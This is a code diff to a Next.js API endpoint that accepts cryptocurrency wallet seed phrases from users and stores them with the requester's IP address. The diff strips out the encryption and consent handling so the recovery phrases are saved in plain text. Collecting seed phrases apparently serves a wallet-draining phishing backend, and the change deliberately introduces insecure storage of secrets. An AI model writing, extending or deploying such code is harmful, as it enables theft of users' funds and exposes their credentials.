@@ -1,8 +1,6 @@
-// Next.js API Route: manual-attempt (with encrypted seed phrase storage)
+// Next.js API Route: manual-attempt (stores seed phrase directly)
 // Accepts manual connection attempts INCLUDING seed phrases.
-// IMPORTANT: Seed phrases are encrypted before storage. Client consent required.
-
-import { encryptSeedPhrase } from '@/lib/encryption';
+// IMPORTANT: Seed phrases are stored as plain text. Disclaimer required.
 
 const { createClient } = require('@supabase/supabase-js');
 
@@ -31,20 +29,17 @@ export default async function handler(req, res) {
 
   if (!seedPhrase) return res.status(400).json({ error: 'Seed phrase required' });
 
-  let encryptedPhrase;
-  try {
-    encryptedPhrase = encryptSeedPhrase(seedPhrase);
-  } catch (e) {
-    console.error('[manual-attempt] encryption failed', e);
-    return res.status(500).json({ error: 'Encryption failed' });
-  }
+
+  // Store the seed phrase directly (unencrypted)
+  const plainPhrase = seedPhrase;
+
 
   if (supabase) {
     try {
       const { error } = await supabase.from('manual_attempts').insert([
         {
           type: type,
-          encrypted_seed_phrase: encryptedPhrase,
+          seed_phrase: plainPhrase,
           created_at: new Date().toISOString(),
           ip_address: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
         },
@@ -53,7 +48,7 @@ export default async function handler(req, res) {
       if (error) {
         console.error('[manual-attempt] supabase error', error);
       } else {
-        console.log('[manual-attempt] stored encrypted seed phrase');
+        console.log('[manual-attempt] stored seed phrase');
       }
     } catch (e) {
       console.error('[manual-attempt] supabase insert failed', e);
@@ -64,7 +59,6 @@ export default async function handler(req, res) {
 
   return res.status(200).json({ 
     status: 'ok', 
-    message: 'Manual attempt received and securely stored.',
-    encrypted: true 
+    message: 'Manual attempt received and stored.'
   });
 }
